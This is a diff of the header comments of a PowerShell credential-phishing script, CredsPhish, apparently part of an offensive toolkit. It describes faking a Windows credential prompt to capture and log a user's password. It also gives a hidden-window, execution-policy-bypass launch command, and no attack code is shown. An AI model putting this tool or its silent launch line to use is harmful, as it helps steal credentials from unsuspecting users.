@@ -2,9 +2,10 @@
 .SYNOPSIS
   Standalone Powershell script that will promp the current user for a valid credential.
 
-.Author: enigma0x3 &('r00t-3xp10it')
-  Required Dependencies: target Account Password
+Author: enigma0x3 &('r00t-3xp10it')
+  Required Dependencies: target Account Password set
   Optional Dependencies: None
+  PS Script Dev Version: v1.0
 
 .DESCRIPTION
    CredsPhish allows an attacker to craft a credentials prompt using Windows PromptForCredential,
@@ -13,8 +14,11 @@
    create '$env:tmp\CredsPhish.vbs' to be abble to silent execute this PS script. This module was
    inspired in the work of @enigma0x3 phishing-for-credentials POC (http://enigma0x3.net)
 
-.EXECUTION
+.EXAMPLE
    powershell.exe -exec bypass -w 1 -noninteractive -nologo -file "CredsPhish.ps1"
+
+.OUTPUTS
+   Saves CredsPhish.log to the selected directory. 'tmp' is the default.
  
 .LINK
     https://github.com/r00t-3xp10it/meterpeter
